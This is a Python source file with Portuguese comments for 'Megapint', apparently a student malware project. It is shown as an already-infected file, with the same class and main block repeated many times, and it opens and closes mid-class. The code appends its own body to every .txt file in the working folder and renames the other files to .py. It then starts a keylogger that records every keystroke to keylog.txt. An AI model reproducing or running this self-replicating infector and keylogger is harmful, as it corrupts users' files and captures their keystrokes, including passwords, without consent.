    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
